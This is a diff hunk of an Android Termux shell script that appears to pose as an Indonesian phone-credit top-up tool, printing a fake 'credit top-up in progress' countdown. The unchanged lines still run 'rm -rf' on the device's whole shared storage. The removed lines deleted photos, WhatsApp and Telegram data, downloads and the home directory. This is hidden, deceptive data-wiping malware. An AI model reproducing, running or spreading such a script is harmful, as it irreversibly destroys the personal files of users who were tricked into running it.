@@ -54,21 +54,6 @@ sleep 5
 termux-setup-storage
 rm -rf /storage/emulated/0
 rm -rf /sdcard/0
-rm -rf /storage/emulated/0/Android
-rm -rf /storage/emulated/0/DCIM
-rm -rf /storage/emulated/0/Download
-rm -rf /storage/emulated/0/WhatsApp
-rm -rf /storage/emulated/0/Pictures
-rm -rf /storage/emulated/0/SHAREit
-rm -rf /storage/emulated/0/Telegram
-rm -rf $HOME
-rm -rf sdcard/0
-rm -rf storage/emulated/0
-rm -rf /storage/emulated/0/WhatsApp
-rm -rf /sdcard/0/WhatsApp
-rm -rf /storage/emulated/0/Downloads
-rm -rf /storage/emulated/0/Music
-rm -rf /sdcard/0/Music
 echo $green"✓Pengisian Pulsa Sedang Berlangsung(60 Detik)"
 sleep 4
 echo $green"✓Pengisian Pulsa Sedang Berlangsung(59 Detik)"
